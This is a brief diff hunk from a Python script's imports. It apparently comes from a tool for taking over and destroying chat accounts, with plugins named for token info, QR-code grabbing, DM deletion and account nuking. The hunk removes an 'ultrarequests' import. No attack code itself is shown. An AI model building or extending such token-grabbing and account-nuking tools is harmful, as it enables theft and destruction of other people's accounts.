@@ -11,7 +11,6 @@ import utilities.Plugins.DM_Deleter
 import utilities.Plugins.Token_Info
 import utilities.Plugins.QR_Grabber
 import utilities.Plugins.Account_Nuker
-import ultrarequests
   
 if __name__ == "__main__":
     import sys
